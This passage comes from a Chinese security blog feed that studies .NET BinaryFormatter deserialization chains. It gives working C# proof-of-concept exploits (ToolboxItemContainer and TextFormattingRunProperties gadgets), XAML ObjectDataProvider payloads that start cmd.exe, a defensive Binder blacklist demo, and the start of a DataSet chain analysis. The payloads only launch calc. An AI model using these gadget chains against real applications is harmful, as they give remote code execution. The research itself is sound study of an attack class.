class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">NancySerialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">            <span class="built_in">byte</span>[] vs;</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memory = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                binaryFormatter.Serialize(memory, <span class="keyword">new</span> TextFormattingRunPropertiesMarshal(<span class="string">&quot;calc&quot;</span>));</span><br><span class="line">                vs = memory.ToArray();</span><br><span class="line">            &#125;</span><br><span class="line">            ToolboxItemSerializerMarshal toolBox = <span class="keyword">new</span> ToolboxItemSerializerMarshal(vs);</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                binaryFormatter.Serialize(memoryStream, toolBox);</span><br><span class="line">                memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">                binaryFormatter.Deserialize(memoryStream);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ToolboxItemSerializerMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">ToolboxItemSerializerMarshal</span>(<span class="params"><span class="built_in">byte</span>[] payload</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Payload = payload;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">byte</span>[] Payload &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            info.SetType(Type.GetType(<span class="string">&quot;System.Drawing.Design.ToolboxItemContainer+ToolboxItemSerializer, System.Drawing.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;</span>));</span><br><span class="line">            info.AddValue(<span class="string">&quot;AssemblyName&quot;</span>, <span class="keyword">new</span> AssemblyName());</span><br><span class="line">            info.AddValue(<span class="string">&quot;Stream&quot;</span>, Payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">gadget</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// ObjectDataProvider</span></span><br><span class="line">            ProcessStartInfo psi = <span class="keyword">new</span> ProcessStartInfo();</span><br><span class="line">            psi.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">            psi.Arguments = <span class="string">$&quot;/c <span class="subst">&#123;cmd&#125;</span>&quot;</span>;</span><br><span class="line">            StringDictionary dict = <span class="keyword">new</span> StringDictionary();</span><br><span class="line">            psi.GetType().GetField(<span class="string">&quot;environmentVariables&quot;</span>, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span><br><span class="line">            Process p = <span class="keyword">new</span> Process();</span><br><span class="line">            p.StartInfo = psi;</span><br><span class="line">            ObjectDataProvider odp = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            odp.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">            odp.IsInitialLoadEnabled = <span class="literal">false</span>;</span><br><span class="line">            odp.ObjectInstance = p;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> XamlWriter.Save(odp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单来讲就是<code>ObjectDataProvider</code>和<code>TextFormattingRunProperties</code>生成payload  然后在序列化的时候讲序列化字节流给<code>ToolboxItemContainer</code>类里的<code>Stream</code>参数赋值</p><p><img src="../images/image-20240226205529437.png" alt="image-20240226205529437"></p><p>这个类是生成xaml的payload  然后在<code>GetObjectData</code>函数中对TextFormattingRunProperties的_xaml参数进行赋值</p><p><img src="../images/image-20240226205738291.png" alt="image-20240226205738291"></p><p><img src="../images/image-20240226205812311.png" alt="image-20240226205812311"></p><p>这个就是我们的本篇文章主要用的类了<code>ToolboxItemContainer</code>   其构造函数和<code>GetObjectData</code>函数就是为了给里面的Stream参数赋值的</p><p><img src="../images/image-20240226205936240.png" alt="image-20240226205936240"></p><p>然后再看起main函数  写的和我们一样   就是先序列化<code>TextFormattingRunPropertiesMarshal</code>这个类  生成字节流  然后再序列化<code>ToolboxItemSerializerMarshal</code>这个类  将Stream参数进行赋值   然后再反序列化就行了</p><p><img src="../images/image-20240226210155219.png" alt="image-20240226210155219"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Y4er/dotnet-deserialization/blob/main/Nancy.md&quot;&gt;https://github.com/Y4er/dotnet-deserialization/blob/main/Nanc</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-03</title>
    <link href="https://ke1nys.github.io/posts/4af57b1b.html"/>
    <id>https://ke1nys.github.io/posts/4af57b1b.html</id>
    <published>2024-02-25T09:24:49.000Z</published>
    <updated>2024-02-26T02:34:29.362Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://boogipop.com/2024/02/07/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20BinaryFormatter%20Deserialization%2003/">https://boogipop.com/2024/02/07/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20BinaryFormatter%20Deserialization%2003/</a></p><p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/BinaryFormatter.md">https://github.com/Y4er/dotnet-deserialization/blob/main/BinaryFormatter.md</a></p><p>这一篇文章主要讲的是这个BinaryFormatter</p><h2 id="BinaryFormatter"><a href="#BinaryFormatter" class="headerlink" title="BinaryFormatter"></a>BinaryFormatter</h2><p>这个类其实我们在Dotnet-Deserialization-01的时候就简略的描述过了    他的一些基本参数我们也讲了  序列化的生命周期也讲了   接下来主要讲的就是这个<code>Binder</code>和<code>SurrogateSelector</code></p><p><img src="../images/image-20240225172852335.png" alt="image-20240225172852335"></p><p>Binder就相当于我们java中的<code>resolveclass</code>   可以用来设置反序列化类的黑名单</p><p>SurrogateSelector就是代理器  在01的时候也讲了一下</p><h2 id="Binder-过滤器"><a href="#Binder-过滤器" class="headerlink" title="Binder 过滤器"></a>Binder 过滤器</h2><p>一个简单的demo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Runtime.Serialization;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"></span><br><span class="line">public class CustomSerializationBinder : SerializationBinder</span><br><span class="line">&#123;</span><br><span class="line">    public override Type BindToType(string assemblyName, string typeName)</span><br><span class="line">    &#123;</span><br><span class="line">        // 在反序列化时，检查类型是否在黑名单中</span><br><span class="line">        if (IsTypeInBlacklist(typeName))</span><br><span class="line">        &#123;</span><br><span class="line">            throw new SerializationException(&quot;Deserialization of this type is not allowed.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 使用默认绑定</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private bool IsTypeInBlacklist(string typeName)</span><br><span class="line">    &#123;</span><br><span class="line">        // 在这里添加黑名单检查的逻辑</span><br><span class="line">        // 返回 true 表示在黑名单中，返回 false 表示不在黑名单中</span><br><span class="line">        return typeName.Contains(&quot;EvilClass&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">[Serializable]</span><br><span class="line">public class EvilClass</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[Serializable]</span><br><span class="line">public class MyClass</span><br><span class="line">&#123;</span><br><span class="line">    public string Name &#123; get; set; &#125;</span><br><span class="line">    public int Age &#123; get; set; &#125;</span><br><span class="line">    public object data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Program</span><br><span class="line">&#123;</span><br><span class="line">    static void Main()</span><br><span class="line">    &#123;</span><br><span class="line">        // 创建对象实例</span><br><span class="line">        MyClass myObject = new MyClass &#123; Name = &quot;John&quot;, Age = 25 &#125;;</span><br><span class="line">        var evilClass = new EvilClass();</span><br><span class="line">        myObject.data = evilClass;</span><br><span class="line"></span><br><span class="line">        // 使用BinaryFormatter进行序列化，并设置自定义的SerializationBinder</span><br><span class="line">        BinaryFormatter formatter = new BinaryFormatter();</span><br><span class="line">        formatter.Binder = new CustomSerializationBinder();</span><br><span class="line"></span><br><span class="line">        using (MemoryStream stream = new MemoryStream())</span><br><span class="line">        &#123;</span><br><span class="line">            formatter.Serialize(stream, myObject);</span><br><span class="line"></span><br><span class="line">            // 将流位置重置为开始</span><br><span class="line">            stream.Seek(0, SeekOrigin.Begin);</span><br><span class="line"></span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                // 使用BinaryFormatter进行反序列化</span><br><span class="line">                MyClass deserializedObject = (MyClass)formatter.Deserialize(stream);</span><br><span class="line"></span><br><span class="line">                // 输出反序列化后的对象属性</span><br><span class="line">                Console.WriteLine($&quot;Name: &#123;deserializedObject.Name&#125;, Age: &#123;deserializedObject.Age&#125;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            catch (SerializationException ex)</span><br><span class="line">            &#123;</span><br><span class="line">                // 处理反序列化异常</span><br><span class="line">                Console.WriteLine($&quot;Error during deserialization: &#123;ex.Message&#125;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240225173905242.png" alt="image-20240225173905242"></p><p>匹配到指定的EvilClass这个类   然后就抛出异常</p><p>这个过程和Java反序列化中的Resolveclass顺序是一致的，先读取当前类的类型，再读取成员变量的类型，最后还原成对象。</p><p>主要的逻辑就是CustomSerializationBinder类中的BindToType方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public override Type BindToType(string assemblyName, string typeName)</span><br><span class="line">&#123;</span><br><span class="line">    // 在反序列化时，检查类型是否在黑名单中</span><br><span class="line">    if (IsTypeInBlacklist(typeName))</span><br><span class="line">    &#123;</span><br><span class="line">        throw new SerializationException(&quot;Deserialization of this type is not allowed.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 使用默认绑定 </span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(那个SurrogateSelector 代理器这里就不多写了   不了解的可以去看01的那篇文章  有详细的介绍)</p><p><strong>简单来说他的作用就是让本不可以序列化的类可以进行序列化</strong></p><h2 id="TextFormattingRunProperties利用链"><a href="#TextFormattingRunProperties利用链" class="headerlink" title="TextFormattingRunProperties利用链"></a>TextFormattingRunProperties利用链</h2><p>如果没找到这个类报错的话  我们就得手动导入</p><p><img src="../images/image-20240225175352997.png" alt="image-20240225175352997"></p><p><img src="../images/image-20240225175918652.png" alt="image-20240225175918652"></p><p>这个类是继承于这个ISerializable接口的   然后因为没有使用代理器  等会序列化的时候就会调用我们的GetObjectData方法  </p><p><img src="../images/image-20240225180052259.png" alt="image-20240225180052259"></p><p>跟进这个方法</p><p><img src="../images/image-20240225180158967.png" alt="image-20240225180158967"></p><p>发现了我们的老朋友  XamlReader.Parse  并且这个str可控  那么我们就能完成RCE了  我们只需要给他的<code>ForegroundBrush</code>或者是<code>BackgroundBrush</code>属性赋值为我们Xaml的payload即可完成命令执行</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">BinaryFormatterSerialize</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//这个protected的构造函数必须得写  不然会报错  因为在反序列化的时候要调用他</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//在这里设置的TextFormattingRunProperties这个类  因为在序列化的时候优先调用我们自身类的GetObjectData</span></span><br><span class="line">            <span class="comment">//然后再调用TextFormattingRunProperties里面的Get方法</span></span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> xaml</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = xaml;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">string</span> xaml_payload =</span><br><span class="line">                <span class="string">&quot;&lt;ResourceDictionary \n                    xmlns=\&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation\&quot; \n                    xmlns:d=\&quot;http://schemas.microsoft.com/winfx/2006/xaml\&quot; \n                    xmlns:b=\&quot;clr-namespace:System;assembly=mscorlib\&quot; \n                    xmlns:c=\&quot;clr-namespace:System.Diagnostics;assembly=system\&quot;&gt;\n    &lt;ObjectDataProvider d:Key=\&quot;\&quot; ObjectType=\&quot;&#123;d:Type c:Process&#125;\&quot; MethodName=\&quot;Start\&quot;&gt;\n        &lt;ObjectDataProvider.MethodParameters&gt;\n            &lt;b:String&gt;cmd&lt;/b:String&gt;\n            &lt;b:String&gt;/c calc&lt;/b:String&gt;\n        &lt;/ObjectDataProvider.MethodParameters&gt;\n    &lt;/ObjectDataProvider&gt;\n&lt;/ResourceDictionary&gt;&quot;</span>;</span><br><span class="line">            TextFormattingRunPropertiesMarshal payload = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal(xaml_payload);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 构建formatter</span></span><br><span class="line">                BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                binaryFormatter.Serialize(memoryStream, payload);</span><br><span class="line">                memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">                binaryFormatter.Deserialize(memoryStream);</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>xaml的payload就是Dotnet-Deserialization-02给出的payload</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;ResourceDictionary</span><br><span class="line">    xmlns=<span class="string">&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot;</span></span><br><span class="line">    xmlns:sd=<span class="string">&quot;clr-namespace:System.Diagnostics;assembly=System&quot;</span></span><br><span class="line">    xmlns:x=<span class="string">&quot;http://schemas.microsoft</span></span><br><span class="line"><span class="string">.com/winfx/2006/xaml&quot;</span>&gt;</span><br><span class="line">    &lt;ObjectDataProvider MethodName=<span class="string">&quot;Start&quot;</span> x:Key=<span class="string">&quot;a&quot;</span>&gt;</span><br><span class="line">        &lt;ObjectDataProvider.ObjectInstance&gt;</span><br><span class="line">            &lt;sd:Process&gt;</span><br><span class="line">                &lt;sd:Process.StartInfo&gt;</span><br><span class="line">                    &lt;sd:ProcessStartInfo Arguments=<span class="string">&quot;test&quot;</span> S</span><br><span class="line">tandardErrorEncoding=<span class="string">&quot;&#123;x:Null&#125;&quot;</span> StandardOutputEncoding=<span class="string">&quot;&#123;x:Null&#125;&quot;</span> UserName=<span class="string">&quot;&quot;</span> Password=<span class="string">&quot;&#123;x:Null&#125;&quot;</span> Domain=<span class="string">&quot;&quot;</span> LoadUserProfile=<span class="string">&quot;False&quot;</span> FileName=<span class="string">&quot;calc&quot;</span> /&gt;</span><br><span class="line">                &lt;/sd:Process.StartInfo&gt;</span><br><span class="line">            &lt;/sd:Process&gt;</span><br><span class="line">        &lt;/ObjectDataProvider.ObjectInstance&gt;</span><br><span class="line">    &lt;/ObjectDataProvider&gt;</span><br><span class="line">&lt;/ResourceDictionary&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240225181630669.png" alt="image-20240225181630669"></p><p>调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TextFormattingRunProperties.GetObjectFromSerializationInfo()</span><br><span class="line">ObjectManager.CompleteISerializableObject()</span><br><span class="line">ObjectManager.FixupSpecialObject()</span><br><span class="line">ObjectManager.DoFixups()</span><br><span class="line">ObjectReader.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">Program.Main()</span><br></pre></td></tr></table></figure><p>流程  </p><p>就是我们自己写了个继承于ISerializable接口的类   然后重写了GetObjectData方法   里面对TextFormattingRunProperties类的ForegroundBrush参数进行赋值   </p><h2 id="DataSet-Binary二次反序列化"><a href="#DataSet-Binary二次反序列化" class="headerlink" title="DataSet(Binary二次反序列化)"></a>DataSet(Binary二次反序列化)</h2><p><img src="../images/image-20240225182800448.png" alt="image-20240225182800448"></p><p>这个类其实也是实现了ISerializable 接口  也是可以实现像上述TextFormattingRunProperties类的操作  先去看起构造方法</p><p><img src="../images/image-20240225183109294.png" alt="image-20240225183109294"></p><p>其构造方法会进入到DeserializeDataSet这个反序列化函数中  跟进</p><p><img src="../images/image-20240225183158408.png" alt="image-20240225183158408"></p><p>再跟进DeserializeDataSetSchema函数中去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">private void DeserializeDataSetSchema(</span><br><span class="line">      SerializationInfo info,</span><br><span class="line">      StreamingContext context,</span><br><span class="line">      SerializationFormat remotingFormat,</span><br><span class="line">      SchemaSerializationMode schemaSerializationMode)</span><br><span class="line">    &#123;</span><br><span class="line">      if (remotingFormat != SerializationFormat.Xml)</span><br><span class="line">      &#123;</span><br><span class="line">        if (schemaSerializationMode == SchemaSerializationMode.IncludeSchema)</span><br><span class="line">        &#123;</span><br><span class="line">          this.DeserializeDataSetProperties(info, context);</span><br><span class="line">          int int32 = info.GetInt32(&quot;DataSet.Tables.Count&quot;);</span><br><span class="line">          for (int index = 0; index &lt; int32; ++index)</span><br><span class="line">          &#123;</span><br><span class="line">            MemoryStream serializationStream = new MemoryStream((byte[]) info.GetValue(string.Format((IFormatProvider) CultureInfo.InvariantCulture, &quot;DataSet.Tables_&#123;0&#125;&quot;, new object[1]</span><br><span class="line">            &#123;</span><br><span class="line">              (object) index</span><br><span class="line">            &#125;), typeof (byte[])));</span><br><span class="line">            serializationStream.Position = 0L;</span><br><span class="line">            this.Tables.Add((DataTable) new BinaryFormatter((ISurrogateSelector) null, new StreamingContext(context.State, (object) false)).Deserialize((Stream) serializationStream));</span><br><span class="line">          &#125;</span><br><span class="line">          for (int index = 0; index &lt; int32; ++index)</span><br><span class="line">            this.Tables[index].DeserializeConstraints(info, context, index, true);</span><br><span class="line">          this.DeserializeRelations(info, context);</span><br><span class="line">          for (int index = 0; index &lt; int32; ++index)</span><br><span class="line">            this.Tables[index].DeserializeExpressionColumns(info, context, index);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">          